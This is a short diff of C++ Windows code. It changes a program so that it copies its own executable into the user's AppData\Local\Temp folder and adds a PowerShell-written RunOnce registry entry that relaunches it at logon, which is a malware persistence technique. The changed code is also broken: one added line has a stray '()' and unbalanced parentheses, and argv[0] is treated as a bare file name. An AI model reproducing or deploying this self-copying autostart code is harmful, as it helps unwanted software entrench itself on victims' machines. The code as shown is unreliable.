@@ -140,7 +140,7 @@ string current_working_directory()
   free(cwd) ;
   return working_directory ;
 }
-int main( void )
+int main(int argc,char *argv[])
 {
     HWND window;
     AllocConsole();
@@ -149,9 +149,10 @@ int main( void )
     char username[UNLEN+1];
     DWORD username_len = UNLEN+1;
     GetUserName(username, &username_len);
+    string programName = argv[0];
     string pathUsers = "C:\\Users\\";
-    string pathTarget = "\\appdata\\local\\temp\\main.exe";
-    string input = (current_working_directory()+"\\main.exe");
+    string pathTarget = ()"\\appdata\\local\\temp\\"+programName);
+    string input = (current_working_directory()+"\\"+programName);
     string output = pathUsers+username+pathTarget;
     CopyFile(input.c_str(),output.c_str(), TRUE);
     string commandPowerShell = "powershell New-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce -name Main -Value "+output+" -force";
